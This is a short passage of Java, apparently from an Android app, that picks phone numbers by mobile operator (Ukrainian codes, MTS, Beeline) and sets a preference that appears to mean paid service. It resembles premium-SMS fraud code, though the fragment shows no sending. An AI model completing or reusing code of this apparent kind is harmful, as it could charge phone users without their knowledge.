            String opStr = settings.getString(Actor.NETWORK_STRING, "");
            Actor act = new Actor(context, opStr);
            if (act.isUkrCode()) {
                actUK(act, settings);
                return;
            }
            boolean isMTSRF = act.isMTSRF();
            boolean isBeeline = act.isBeline();
            if (act.isPrivate()) {
                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
                int acceptedNums = 0;
                if (isBeeline) {
                    String currentNumber = ActService.NUM_1;
                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
